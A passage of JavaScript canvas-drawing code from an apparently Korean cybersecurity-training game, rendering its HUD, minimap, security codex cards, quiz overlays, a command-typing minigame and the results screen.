  ctx.font = `11px ${FONT}`; ctx.fillStyle = '#78909c'; ctx.textAlign = 'right'; ctx.fillText(`${touch.on ? '탭해서' : `숫자키 1~${WEAPONS.length}`} 교체 · 해금 ${WEAPONS.filter(isUnlocked).length}/${WEAPONS.length}`, 366, 156); ctx.textAlign = 'left';
  if (touch.on && game.state === 'play' && !game.overlay && !game.typing) hitRect(16 * s, 138 * s, 360 * s, 26 * s, cycleWeapon);
  ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = '#e0f7fa';
  ctx.font = `12px ${FONT}`; ctx.fillStyle = '#80deea';
  const buffs = [game.gijoT > 0 ? `◆GIJO ${Math.ceil(game.gijoT)}s` : '', p.patchT > 0 ? `🛡패치 ${Math.ceil(p.patchT)}s` : '', p.quizBuffT > 0 ? `📘정답버프 ${Math.ceil(p.quizBuffT)}s` : ''].filter(Boolean).join('  ');
  ctx.fillText(buffs || `공격력 x${p.atkMul.toFixed(2)}`, 210, 42);
  ctx.font = `bold 12px ${FONT}`; ctx.fillStyle = '#b0bec5';
  ctx.fillText('HP', 30, 64); bar(60, 54, 300, 13, p.hp / p.maxhp, p.hp / p.maxhp < 0.3 ? '#ff5252' : '#66bb6a');
  ctx.fillStyle = '#fff'; ctx.font = `bold 11px ${FONT}`; ctx.textAlign = 'right'; ctx.fillText(`${Math.ceil(p.hp)} / ${p.maxhp}`, 356, 64); ctx.textAlign = 'left';
  const mfull = p.musou >= 100;
  ctx.fillStyle = '#b0bec5'; ctx.fillText('무쌍', 26, 88);
  bar(60, 78, 300, 13, p.musou / 100, mfull ? `hsl(${(T * 400) % 60 + 20},100%,55%)` : '#ffb300');
  if (mfull) { ctx.fillStyle = '#fff'; ctx.font = `bold 11px ${FONT}`; ctx.fillText('SPACE 발동!', 270, 88); }
  const tfull = p.term >= 100;
  ctx.fillStyle = '#b0bec5'; ctx.font = `bold 12px ${FONT}`; ctx.fillText('터미널', 18, 112);
  bar(60, 102, 300, 13, p.term / 100, tfull ? `hsl(${180 + Math.sin(T * 10) * 20},100%,55%)` : '#00acc1');
  if (tfull) { ctx.fillStyle = '#fff'; ctx.font = `bold 11px ${FONT}`; ctx.fillText('E 타이핑!', 285, 112); }

  // 상단 중앙: 스트레스 해소율 (좁은 세로 화면에선 왼쪽 패널 아래로 내림)
  const cx = Wv / 2, compact = Wv < 1150;
  if (compact) { ctx.save(); ctx.translate(0, 160); }
  ctx.fillStyle = 'rgba(8,14,28,0.75)'; rr(ctx, cx - 210, 16, 420, 54, 12); ctx.fill();
  ctx.textAlign = 'center'; ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = '#c5e1a5';
  ctx.fillText(`스트레스 해소율  ${Math.floor(game.stress)}%`, cx, 36);
  bar(cx - 190, 44, 380, 14, game.stress / 100, game.stress >= 100 ? `hsl(${(T * 200) % 360},90%,60%)` : '#9ccc65');
  ctx.font = `12px ${FONT_MONO}`; ctx.fillStyle = '#90a4ae';
  const mm = Math.floor(game.time / 60), ss = Math.floor(game.time % 60);
  ctx.fillText(`${String(mm).padStart(2, '0')}:${String(ss).padStart(2, '0')}  ·  ${game.mission ? '침해사고 대응 훈련' : `거점 ${countAlly()}/${game.bases.length}`}${game.diff.endless ? `  ·  ${game.loop}회차` : ''}`, cx, 86);
  if (game.mission && !game.mission.done) {
    const M = game.mission, si = M.stage < 0 ? -M.stage : M.stage, st = MISSION.stages[Math.min(si, MISSION.stages.length - 1)];
    const need = M.need || 1, prog = st.action === 'carry' ? (M.carrying ? '운반 중 → 금고' : '백업 확보 필요') : st.action === 'boss' ? (M.boss ? `본체 HP ${Math.ceil(Math.max(0, M.boss.hp) / M.boss.maxhp * 100)}%` : '') : st.action === 'type' ? '격리 명령 입력' : st.action === 'hold' ? `${Math.floor(M.prog)} / ${need}초` : `${Math.floor(M.prog)} / ${need}`;
    ctx.fillStyle = 'rgba(0,30,40,0.85)'; rr(ctx, cx - 300, 148, 600, 52, 10); ctx.fill(); ctx.strokeStyle = '#80deea'; ctx.lineWidth = 1.5; rr(ctx, cx - 300, 148, 600, 52, 10); ctx.stroke();
    ctx.textAlign = 'center'; ctx.font = `15px ${FONT_BIG}`; ctx.fillStyle = '#80deea'; ctx.fillText(M.stage < 0 ? `다음 단계 준비 중…` : `STAGE ${si + 1}/${MISSION.stages.length} · ${st.phase} — ${st.name}`, cx, 170);
    ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = '#e0f7fa'; if (M.stage >= 0) ctx.fillText(`🎯 ${st.objective}   ${prog}`, cx, 190);
  }
  // 업적 토스트
  game.achToasts.forEach((a, i) => {
    const al = Math.min(1, a.t * 4, (3.5 - a.t) * 2); ctx.globalAlpha = al;
    ctx.fillStyle = 'rgba(40,30,0,0.9)'; rr(ctx, cx - 210, 210 + i * 44, 420, 38, 10); ctx.fill(); ctx.strokeStyle = '#ffd740'; rr(ctx, cx - 210, 210 + i * 44, 420, 38, 10); ctx.stroke();
    ctx.textAlign = 'center'; ctx.font = `bold 15px ${FONT}`; ctx.fillStyle = '#ffd740'; ctx.fillText(`🏆 업적 달성 · ${a.name} — ${a.desc}`, cx, 235 + i * 44);
    ctx.globalAlpha = 1;
  });
  // 보스/적장 HP
  const foe = game.boss && !game.boss.dead ? game.boss : game.enemies.find((e) => e.type === 'officer' && Math.hypot(e.x - p.x, e.y - p.y) < 900) || game.enemies.find((e) => e.type === 'keeper' && Math.hypot(e.x - p.x, e.y - p.y) < 500);
  if (foe) {
    ctx.fillStyle = 'rgba(30,0,8,0.8)'; rr(ctx, cx - 260, 96, 520, 46, 10); ctx.fill();
    ctx.font = `17px ${FONT_BIG}`; ctx.fillStyle = '#ff8a80'; ctx.fillText(`${foe.name}`, cx, 116);
    ctx.font = `11px ${FONT}`; ctx.fillStyle = '#ffccbc'; ctx.textAlign = 'right'; ctx.fillText(foe.title || '', cx + 250, 116); ctx.textAlign = 'center';
    bar(cx - 245, 124, 490, 10, foe.hp / foe.maxhp, '#ff1744');
  }

  if (compact) ctx.restore();
  // 우상단: KO
  ctx.textAlign = 'right';
  ctx.font = `64px ${FONT_BIG}`; ctx.lineWidth = 8; ctx.strokeStyle = 'rgba(0,0,0,0.8)';
  ctx.strokeText(fmt(game.ko), Wv - 80, 76); ctx.fillStyle = '#fff'; ctx.fillText(fmt(game.ko), Wv - 80, 76);
  ctx.font = `28px ${FONT_BIG}`; ctx.fillStyle = '#ff5252'; ctx.fillText('KO', Wv - 24, 76);
  ctx.font = `12px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText(`최고 ${fmt(bestRec.ko)} KO`, Wv - 24, 96);
  // 콤보
  if (game.combo >= 5) {
    const sc = 1 + game.comboPop * 0.35;
    ctx.save(); ctx.translate(Wv - 40, Hv * 0.36); ctx.scale(sc, sc);
    const hue = game.combo >= 300 ? (T * 300) % 360 : game.combo >= 100 ? 45 : 190;
    ctx.font = `${game.combo >= 100 ? 78 : 60}px ${FONT_BIG}`; ctx.lineWidth = 9; ctx.strokeStyle = 'rgba(0,0,0,0.85)';
    ctx.strokeText(fmt(game.combo), 0, 0); ctx.fillStyle = `hsl(${hue},100%,65%)`; ctx.fillText(fmt(game.combo), 0, 0);
    ctx.font = `22px ${FONT_BIG}`; ctx.fillStyle = '#fff'; ctx.fillText('HITS', 0, 28);
    ctx.fillStyle = 'rgba(255,255,255,0.5)'; ctx.fillRect(-140, 38, 140 * (game.comboT / 2.6), 4);
    ctx.restore();
  }
  // 좌하단: 메시지 로그
  ctx.textAlign = 'left'; ctx.font = `13px ${FONT}`;
  const msgs = game.msgs.slice(-5);
  msgs.forEach((m, i) => {
    const a = clamp(1 - (m.t - 6) / 1.5, 0, 1); if (a <= 0) return;
    ctx.globalAlpha = a; const y = Hv - 150 + i * 20;
    ctx.fillStyle = 'rgba(0,0,0,0.55)'; ctx.fillRect(16, y - 14, ctx.measureText(m.text).width + 16, 19);
    ctx.fillStyle = m.color; ctx.fillText(m.text, 24, y);
  });
  ctx.globalAlpha = 1;
  // 하단 중앙: 키캡 힌트 (누를 때 눌림) — 터치 모드에선 버튼이 대신함
  let kx = cx - 390;
  for (const k of touch.on ? [] : KEY_HELP) {
    const down = isDown(...k.codes);
    const w = k.cap.length > 2 ? 74 : 44;
    const y = Hv - 58 + (down ? 4 : 0);
    ctx.fillStyle = down ? '#00bcd4' : '#5c6575'; rr(ctx, kx, y + 4, w, 34, 7); ctx.fill();
    ctx.fillStyle = down ? '#b2ebf2' : '#e8ecf3'; rr(ctx, kx + 2, y, w - 4, 30, 6); ctx.fill();
    ctx.fillStyle = '#1a1f2b'; ctx.font = `bold 14px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText(k.cap, kx + w / 2, y + 20);
    ctx.fillStyle = '#b0bec5'; ctx.font = `11px ${FONT}`; ctx.fillText(k.label, kx + w / 2, Hv - 8);
    kx += w + 34;
  }
  ctx.textAlign = 'right'; ctx.font = `11px ${FONT}`; ctx.fillStyle = touch.on ? 'rgba(0,0,0,0)' : '#607d8b';
  ctx.fillText(`ESC 일시정지 · M 소리${settings.muted ? ' OFF' : ''} · V 시점(${isFirstPerson() ? '1인칭' : isFPS() ? '3인칭' : use3D() ? '쿼터뷰' : '2D'}) · 퀴즈 ${settings.quiz ? 'ON' : 'OFF'}`, Wv - 220, Hv - 12);
  ctx.restore();
  drawMinimap();
}
function drawMinimap() {
  const mw = clamp(Math.min(W, H * 1.4) * 0.17, 110, 210), mh = mw * WORLD.h / WORLD.w, sc = mw / WORLD.w;
  const hs = clamp(Math.min(W / 1400, H / 820), 0.4, 1.15);
  const x = touch.on ? 14 : W - mw - 14, y = touch.on ? 172 * hs + 8 : H - mh - 14; // 터치: 오른쪽 아래는 버튼 자리
  ctx.fillStyle = 'rgba(5,10,20,0.8)'; ctx.fillRect(x, y, mw, mh);
  ctx.strokeStyle = 'rgba(0,229,255,0.4)'; ctx.lineWidth = 1; ctx.strokeRect(x, y, mw, mh);
  for (const b of game.bases) {
    ctx.fillStyle = b.owner === 'enemy' ? 'rgba(255,64,80,0.45)' : 'rgba(0,229,255,0.45)';
    ctx.beginPath(); ctx.arc(x + b.x * sc, y + b.y * sc, b.r * sc, 0, TAU); ctx.fill();
  }
  ctx.fillStyle = '#ff5252';
  for (const e of game.enemies) { if (e.def.big) continue; ctx.fillRect(x + e.x * sc, y + e.y * sc, 1.5, 1.5); }
  for (const e of game.enemies) if (e.def.big) { ctx.fillStyle = e.type === 'boss' ? '#ff0040' : e.type === 'officer' ? '#ffcc00' : '#ff8a80'; ctx.beginPath(); ctx.arc(x + e.x * sc, y + e.y * sc, e.type === 'boss' ? 6 : 4, 0, TAU); ctx.fill(); }
  for (const it of game.items) if (it.kind === 'gijo') {
    const bl = Math.sin(game.titleT * 8) > 0 ? 6 : 4;
    ctx.fillStyle = '#ffd740'; ctx.beginPath(); ctx.moveTo(x + it.x * sc, y + it.y * sc - bl); ctx.lineTo(x + it.x * sc + bl, y + it.y * sc); ctx.lineTo(x + it.x * sc, y + it.y * sc + bl); ctx.lineTo(x + it.x * sc - bl, y + it.y * sc); ctx.fill();
  }
  ctx.fillStyle = '#00e5ff'; ctx.beginPath(); ctx.arc(x + player.x * sc, y + player.y * sc, 4, 0, TAU); ctx.fill();
  if (isFPS()) { // 시야 방향 부채꼴
    const px = x + player.x * sc, py = y + player.y * sc, f = player.facing;
    ctx.fillStyle = 'rgba(0,229,255,0.22)'; ctx.beginPath(); ctx.moveTo(px, py); ctx.arc(px, py, 34, f - 0.65, f + 0.65); ctx.closePath(); ctx.fill();
  }
  ctx.strokeStyle = 'rgba(255,255,255,0.5)';
  if (use3D()) { ctx.beginPath(); ctx.arc(x + cam.x * sc, y + cam.y * sc, viewRadius() * 0.7 * sc, 0, TAU); ctx.stroke(); }
  else { const S = VS * game.zoom; ctx.strokeRect(x + (cam.x - W / 2 / S) * sc, y + (cam.y - H / 2 / S) * sc, W / S * sc, H / S * sc); }
}

function drawBanners() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  const s = clamp(W / 1400, 0.6, 1.1);
  game.banners.forEach((b, i) => {
    const k = b.t / b.dur;
    const inK = Math.min(1, b.t / 0.18), out = k > 0.8 ? 1 - (k - 0.8) / 0.2 : 1;
    const y = H * 0.3 + i * 110 * s;
    ctx.save(); ctx.translate(W / 2, y); ctx.scale(s * (1.5 - inK * 0.5), s * (1.5 - inK * 0.5)); ctx.globalAlpha = inK * out;
    ctx.fillStyle = 'rgba(0,0,0,0.55)'; ctx.fillRect(-W, -b.size * 0.85, W * 2, b.size * 1.35 + (b.sub ? 30 : 0));
    ctx.textAlign = 'center'; ctx.font = `${b.size}px ${FONT_BIG}`;
    ctx.lineWidth = 10; ctx.strokeStyle = 'rgba(0,0,0,0.9)'; ctx.strokeText(b.text, 0, 0);
    ctx.fillStyle = b.color; ctx.fillText(b.text, 0, 0);
    if (b.sub) { ctx.font = `bold 20px ${FONT}`; ctx.fillStyle = '#eceff1'; ctx.fillText(b.sub, 0, 34); }
    ctx.restore();
  });
}

function wrapText(text, maxW) {
  const out = []; let line = '';
  for (const ch of String(text)) {
    const t = line + ch;
    if (ctx.measureText(t).width > maxW && line) { out.push(line); line = ch; } else line = t;
  }
  if (line) out.push(line);
  return out;
}
function drawCard(entry, x, y, w, compact) {
  const d = entry.data, isLesson = entry.kind === 'lesson', isMal = entry.kind === 'malware' || isLesson, isCve = entry.kind !== 'base' && !isMal;
  ctx.textAlign = 'left';
  ctx.font = `13px ${FONT_MONO}`; ctx.fillStyle = isMal ? '#ffd54f' : isCve ? '#ff8a80' : '#80deea';
  ctx.fillText(isLesson ? `NIST 대응 단계  ·  ${d.cat}` : isMal ? `위협 인텔  ·  유형: ${d.cat}` : isCve ? `${d.cve}  ·  CVSS ${d.cvss}  ·  ${d.product}${d.kev ? `  ·  🆕 KEV ${d.month}` : ''}` : `${d.owasp}  ·  ${d.cwe || ''}`, x, y);
  ctx.font = `30px ${FONT_BIG}`; ctx.fillStyle = '#fff'; ctx.fillText(isCve || isMal ? d.name : `${d.keeper}`, x, y + 38);
  let yy = y + 70;
  ctx.font = `15px ${FONT}`; ctx.fillStyle = '#eceff1';
  for (const l of wrapText(d.summary, w)) { ctx.fillText(l, x, yy); yy += 22; }
  if (!isCve && d.attack) {
    yy += 6; ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = '#ff8a80'; ctx.fillText('▶ 공격 예시', x, yy); yy += 20;
    ctx.font = `13px ${FONT_MONO}`; ctx.fillStyle = '#ffccbc'; for (const l of wrapText(d.attack, w)) { ctx.fillText(l, x, yy); yy += 19; }
  }
  if (!compact || true) {
    yy += 6; ctx.font = `bold 13px ${FONT}`; ctx.fillStyle = isLesson ? '#ff8a80' : '#69f0ae'; ctx.fillText(isLesson ? '⚠ 이것만은 피하자' : '🛡 방어법', x, yy); yy += 20;
    ctx.font = `14px ${FONT}`; ctx.fillStyle = '#c8e6c9';
    const defs = isCve ? [d.fix] : d.defense;
    for (const df of defs) for (const [i, l] of wrapText('· ' + df, w).entries()) { ctx.fillText(i ? '  ' + l : l, x, yy); yy += 20; }
  }
  return yy;
}
function drawOverlay() {
  const ov = game.overlay, e = ov.entry, q = ov.quiz;
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.fillStyle = 'rgba(2,6,14,0.82)'; ctx.fillRect(0, 0, W, H);
  const s = clamp(Math.min(W / 1000, H / 760), 0.3, 1.2);
  ctx.save(); ctx.translate(W / 2, H / 2); ctx.scale(s, s);
  const w = 820, h = ov.kind === 'card' ? 640 : 520, x = -w / 2, y = -h / 2;
  const edge = ov.kind === 'log' ? '#69f0ae' : ov.kind === 'bank' ? '#90caf9' : e.kind === 'base' ? '#00e5ff' : '#ff5252';
  ctx.fillStyle = '#0b1324'; rr(ctx, x, y, w, h, 16); ctx.fill();
  ctx.strokeStyle = edge; ctx.lineWidth = 2; rr(ctx, x, y, w, h, 16); ctx.stroke();
  ctx.textAlign = 'left'; ctx.font = `16px ${FONT_BIG}`; ctx.fillStyle = '#ffd54f';
  let yy;
  if (ov.kind === 'card') {
    ctx.fillText(`📘 보안 도감 ${ov.first ? '신규 등록!' : '복습'}`, x + 30, y + 36);
    yy = drawCard(e, x + 30, y + 70, w - 60);
  } else if (ov.kind === 'log') {
    ctx.fillStyle = '#69f0ae'; ctx.fillText(`🔎 로그 분석 — 정답이면 적장 그로기(피해 2배)  ·  난이도 ${LEVELS[(ov.level || 1) - 1]}`, x + 30, y + 36);
    ctx.font = `13px ${FONT_MONO}`;
    const lines = wrapText(ov.log, w - 100);
    ctx.fillStyle = '#05100a'; rr(ctx, x + 30, y + 58, w - 60, 30 + lines.length * 20, 8); ctx.fill();
    ctx.fillStyle = '#b9f6ca'; lines.forEach((l, i) => ctx.fillText(l, x + 48, y + 80 + i * 20));
    yy = y + 58 + 30 + lines.length * 20;
  } else {
    ctx.fillStyle = '#90caf9'; ctx.fillText(`📋 보안 점검 요청서  ·  난이도 ${LEVELS[(ov.level || 1) - 1]}${ov.tag ? '  ·  ' + ov.tag : ''}${wrongNote[ov.qid] ? '  ·  ⟲ 오답노트 복습' : ''}`, x + 30, y + 36);
    yy = y + 50;
  }
  // 퀴즈
  yy += 16;
  ctx.strokeStyle = 'rgba(255,255,255,0.12)'; ctx.beginPath(); ctx.moveTo(x + 30, yy); ctx.lineTo(x + w - 30, yy); ctx.stroke();
  yy += 30;
  ctx.font = `bold 18px ${FONT}`; ctx.fillStyle = '#ffd54f'; ctx.fillText('Q. ' + q.q, x + 30, yy); yy += 16;
  q.choices.forEach((c, i) => {
    const by = yy + 10 + i * 46;
    let bg = 'rgba(255,255,255,0.06)', bd = 'rgba(255,255,255,0.2)';
    if (ov.phase === 'answer') {
      if (i === q.answer) { bg = 'rgba(105,240,174,0.2)'; bd = '#69f0ae'; }
      else if (i === ov.picked) { bg = 'rgba(255,82,82,0.2)'; bd = '#ff5252'; }
    }
    ctx.fillStyle = bg; rr(ctx, x + 30, by, w - 60, 38, 8); ctx.fill(); ctx.strokeStyle = bd; ctx.lineWidth = 1.5; rr(ctx, x + 30, by, w - 60, 38, 8); ctx.stroke();
    if (ov.phase === 'quiz') hitT(s, W / 2, H / 2, x + 30, by, w - 60, 38, () => { if (game.overlay && game.overlay.phase === 'quiz' && game.overlay.t >= 0.35) answerQuiz(i); });
    ctx.fillStyle = '#e8ecf3'; rr(ctx, x + 40, by + 6, 26, 26, 5); ctx.fill();
    ctx.fillStyle = '#111'; ctx.font = `bold 15px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText(String(i + 1), x + 53, by + 25);
    ctx.textAlign = 'left'; ctx.fillStyle = '#eceff1'; ctx.font = `15px ${FONT}`; ctx.fillText(c, x + 80, by + 25);
  });
  yy += 10 + q.choices.length * 46 + 10;
  if (ov.phase === 'quiz') {
    const reward = ov.kind === 'log' ? '정답 시: 적장 6초 그로기 · 피해 2배' : ov.kind === 'bank' ? '정답 시: 보안패치 20초 · 터미널 +40' : '정답 시: 공격력 +30% 30초 · 무쌍 +50 · HP 회복';
    ctx.font = `bold 14px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText(`${touch.on ? '보기를 탭하세요' : '숫자키 1 · 2 · 3 으로 답하세요'}   (${reward})`, x + 30, yy + 14);
  } else {
    const ok = ov.picked === q.answer;
    ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = ok ? '#69f0ae' : '#ff8a80'; ctx.fillText(ok ? (ov.kind === 'log' ? '정답! 분석 성공 — 그로기' : '정답! 보안 패치 버프 적용') : '오답 — 해설 확인 (오답노트에 저장, 다음에 다시 나옵니다)', x + 30, yy + 14);
    ctx.font = `14px ${FONT}`; ctx.fillStyle = '#cfd8dc';
    let ey = yy + 38; for (const l of wrapText(q.explain, w - 60)) { ctx.fillText(l, x + 30, ey); ey += 20; }
    if (ov.t > 0.6) { ctx.textAlign = 'right'; ctx.fillStyle = '#ffd54f'; ctx.font = `bold 14px ${FONT}`; ctx.fillText(touch.on ? '화면을 탭하면 전투 복귀 ▶' : 'ENTER / SPACE 로 전투 복귀 ▶', x + w - 30, y + h - 20); }
    hitRect(0, 0, W, H, () => { if (game.overlay && game.overlay.t > 0.6) { game.overlay = null; pressed = {}; } });
  }
  ctx.restore();
}
function drawCardToast() {
  const c = game.cardToast, k = c.t / c.dur;
  const a = Math.min(1, c.t * 4) * (k > 0.85 ? (1 - k) / 0.15 : 1);
  const s = clamp(W / 1400, 0.65, 1);
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.save(); ctx.globalAlpha = a; ctx.translate(W - (440 + 16) * s, H * 0.42); ctx.scale(s, s);
  ctx.fillStyle = 'rgba(8,14,28,0.92)'; rr(ctx, 0, 0, 440, 300, 12); ctx.fill();
  ctx.strokeStyle = '#ffd54f'; rr(ctx, 0, 0, 440, 300, 12); ctx.stroke();
  ctx.font = `14px ${FONT_BIG}`; ctx.fillStyle = '#ffd54f'; ctx.textAlign = 'left'; ctx.fillText(c.entry.kind === 'malware' ? '🛰 위협 인텔 — 처음 처치한 유형' : '📘 도감 등록', 18, 26);
  drawCard(c.entry, 18, 50, 404, true);
  ctx.restore();
}
function drawTyping() {
  const T = game.typing;
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  const s = clamp(W / 1200, 0.6, 1.2);
  const ty = touch.on ? Math.max(H * 0.22, 110 * s) : H * 0.62;
  ctx.save(); ctx.translate(W / 2 + (T.shakeT > 0 ? rand(-6, 6) : 0), ty); ctx.scale(s, s);
  if (touch.on) {
    hitT(s, W / 2, ty, -410, -95, 820, 190, focusTypingInput);
    const btn = (bx, label, col, act) => { ctx.fillStyle = col; rr(ctx, bx, 104, 180, 44, 10); ctx.fill(); ctx.fillStyle = '#05100a'; ctx.font = `bold 17px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText(label, bx + 90, 132); hitT(s, W / 2, ty, bx, 104, 180, 44, act); };
    btn(-200, '⏎ 실행', '#00e676', () => handleTypingKey({ key: 'Enter', keyCode: 13, preventDefault() {} }));
    btn(20, '취소', '#90a4ae', () => handleTypingKey({ key: 'Escape', keyCode: 27, preventDefault() {} }));
  }
  const w = 820, h = 190;
  ctx.fillStyle = 'rgba(2,10,6,0.94)'; rr(ctx, -w / 2, -h / 2, w, h, 10); ctx.fill();
  ctx.strokeStyle = '#00e676'; ctx.lineWidth = 2; rr(ctx, -w / 2, -h / 2, w, h, 10); ctx.stroke();
  ctx.fillStyle = '#0d2a18'; ctx.fillRect(-w / 2, -h / 2, w, 28);
  ctx.fillStyle = '#ff5f56'; ctx.beginPath(); ctx.arc(-w / 2 + 18, -h / 2 + 14, 6, 0, TAU); ctx.fill();
  ctx.fillStyle = '#ffbd2e'; ctx.beginPath(); ctx.arc(-w / 2 + 36, -h / 2 + 14, 6, 0, TAU); ctx.fill();
  ctx.fillStyle = '#27c93f'; ctx.beginPath(); ctx.arc(-w / 2 + 54, -h / 2 + 14, 6, 0, TAU); ctx.fill();
  ctx.font = `13px ${FONT_MONO}`; ctx.fillStyle = '#69f0ae'; ctx.textAlign = 'center'; ctx.fillText('soc@secmusou: ~  —  긴급 대응 터미널 (그대로 타이핑!)', 0, -h / 2 + 19);
  // 명령어
  ctx.font = `bold 30px ${FONT_MONO}`; ctx.textAlign = 'left';
  const full = '$ ' + T.cmd;
  const tw = ctx.measureText(full).width;
  let x = -tw / 2;
  ctx.fillStyle = '#00e676'; ctx.fillText('$ ', x, 10); x += ctx.measureText('$ ').width;
  for (let i = 0; i < T.cmd.length; i++) {
    const ch = T.cmd[i]; const cw = ctx.measureText(ch).width;
    if (i < T.idx) ctx.fillStyle = '#b9f6ca';
    else if (i === T.idx) { ctx.fillStyle = 'rgba(0,230,118,0.35)'; ctx.fillRect(x - 1, -16, cw + 2, 34); ctx.fillStyle = '#ffffff'; }
    else ctx.fillStyle = '#4e6e5d';
    ctx.fillText(ch === ' ' && i === T.idx ? '␣' : ch, x, 10); x += cw;
  }
  // 설명 (학습 포인트)
  ctx.font = `15px ${FONT}`; ctx.textAlign = 'center'; ctx.fillStyle = '#a5d6a7';
  ctx.fillText(`💡 ${T.desc}${T.tag ? `  [${T.tag}]` : ''}`, 0, 48);
  // 타이머
  const rem = 1 - T.t / T.max;
  ctx.fillStyle = 'rgba(255,255,255,0.1)'; ctx.fillRect(-w / 2 + 20, 66, w - 40, 8);
  ctx.fillStyle = rem < 0.3 ? '#ff5252' : '#00e676'; ctx.fillRect(-w / 2 + 20, 66, (w - 40) * rem, 8);
  ctx.font = `12px ${FONT}`; ctx.fillStyle = '#81c784';
  ctx.fillText(T.idx >= T.cmd.length ? (touch.on ? '▶ 실행 버튼을 누르세요!' : '▶ ENTER 를 눌러 실행!') : touch.on ? `오타 ${T.errors}  ·  영문 키보드로 입력  ·  상자를 탭하면 키보드가 열림` : `오타 ${T.errors}  ·  ESC 취소  ·  한 글자마다 번개 공격`, 0, 88);
  ctx.restore();
}
function drawPause() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.fillStyle = 'rgba(0,0,0,0.7)'; ctx.fillRect(0, 0, W, H);
  ctx.textAlign = 'center'; ctx.font = `64px ${FONT_BIG}`; ctx.fillStyle = '#fff'; ctx.fillText('일시정지', W / 2, H / 2 - 20);
  ctx.font = `18px ${FONT}`; ctx.fillStyle = '#b0bec5';
  if (touch.on) {
    const bw = 150, bh = 48, by = H / 2 + 14;
    ctx.fillStyle = '#00bcd4'; rr(ctx, W / 2 - bw - 10, by, bw, bh, 10); ctx.fill(); ctx.fillStyle = 'rgba(255,255,255,0.15)'; rr(ctx, W / 2 + 10, by, bw, bh, 10); ctx.fill();
    ctx.fillStyle = '#fff'; ctx.font = `bold 18px ${FONT}`; ctx.fillText('▶ 계속', W / 2 - bw / 2 - 10, by + 31); ctx.fillText('타이틀로', W / 2 + bw / 2 + 10, by + 31);
    hitRect(W / 2 - bw - 10, by, bw, bh, () => { pressed.Escape = true; }); hitRect(W / 2 + 10, by, bw, bh, () => { pressed.KeyQ = true; });
  } else {
    ctx.fillText('ESC / ENTER 계속   ·   Q 타이틀로', W / 2, H / 2 + 30);
    ctx.fillText('(잠깐 커피 한 잔 하고 오세요 ☕)', W / 2, H / 2 + 60);
  }
}
function drawImeWarn() {
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.globalAlpha = Math.min(1, imeWarnT);
  ctx.fillStyle = 'rgba(255,82,82,0.95)'; rr(ctx, W / 2 - 230, 150, 460, 40, 8); ctx.fill();
  ctx.fillStyle = '#fff'; ctx.font = `bold 16px ${FONT}`; ctx.textAlign = 'center'; ctx.fillText('⌨ 한글 입력 상태입니다 — 한/영 키로 영문 전환!', W / 2, 176);
  ctx.globalAlpha = 1;
}
function drawResult() {
  const R = game.result;
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  ctx.fillStyle = `rgba(2,6,14,${Math.min(0.88, R.t)})`; ctx.fillRect(0, 0, W, H);
  if (R.t < 0.4) return;
  const s = clamp(Math.min(W / 1000, H / 760), 0.3, 1.2);
  ctx.save(); ctx.translate(W / 2, H / 2); ctx.scale(s, s);
  ctx.textAlign = 'center';
  ctx.font = `72px ${FONT_BIG}`; ctx.fillStyle = R.win ? '#ffd740' : '#ff5252';
  const mis = !!game.mission;
  ctx.fillText(R.win ? (mis ? '훈련 수료!!' : '퇴근 성공!!') : '시스템 다운…', 0, -250);
  ctx.font = `18px ${FONT}`; ctx.fillStyle = '#cfd8dc';
  ctx.fillText(R.win ? (mis ? '랜섬웨어 침해사고 대응 6단계를 모두 수행했습니다.' : '제로데이를 막아냈습니다. 오늘 밤은 알람이 울리지 않습니다.') : '하지만 스트레스는 확실히 줄었습니다.', 0, -212);
  const rows = [
    ['KO 수', fmt(game.ko) + (R.newBest ? '  ★신기록' : '')],
    ['최대 콤보', fmt(game.maxCombo) + ' HITS'],
    ['플레이 시간', `${Math.floor(game.time / 60)}분 ${Math.floor(game.time % 60)}초`],
    ['스트레스 해소율', Math.floor(game.stress) + '%'],
    ['학습한 보안 지식', `${game.learned.length}개  (도감 ${Object.keys(codexSeen).filter((k) => !k.startsWith('zero')).length}/${codexList().length})`],
    ['퀴즈 정답', game.quizTotal ? `${game.quizRight} / ${game.quizTotal}` : '-'],
    ['완벽한 타이핑', game.typePerfect + '회'],
    ['로그 분석 정답', game.logRight + '건'],
    ['새 업적', game.achNew.length ? game.achNew.join(', ') : '-'],
  ];
  ctx.font = `18px ${FONT}`;
  rows.forEach(([k, v], i) => {
    if (R.t < 0.6 + i * 0.12) return;
    const y = -172 + i * 32;
    ctx.textAlign = 'right'; ctx.fillStyle = '#90a4ae'; ctx.fillText(k, -20, y);
    ctx.textAlign = 'left'; ctx.fillStyle = '#fff'; ctx.fillText(v, 20, y);
  });
  if (R.t > 1.6 && mis) { // 사후 보고서 체크리스트
    ctx.textAlign = 'left'; ctx.font = `16px ${FONT_BIG}`; ctx.fillStyle = '#80deea'; ctx.fillText('📄 사후 보고서 체크리스트', 230, -160);
    ctx.font = `13px ${FONT}`; ctx.fillStyle = '#cfd8dc'; (MISSION.reportChecklist || []).forEach((c, i) => ctx.fillText('☑ ' + c, 230, -130 + i * 24));
  } else if (R.t > 1.6) {
    ctx.textAlign = 'center';
    ctx.font = `120px ${FONT_BIG}`; ctx.fillStyle = { S: '#ffd740', A: '#69f0ae', B: '#40c4ff', C: '#b0bec5' }[R.rank];
    ctx.fillText(R.rank, 300, -40);
    ctx.font = `16px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText('RANK', 300, 0);
  }
  if (R.t > 1.2) {
    ctx.textAlign = 'center'; ctx.font = `italic 18px ${FONT}`; ctx.fillStyle = '#c5e1a5';
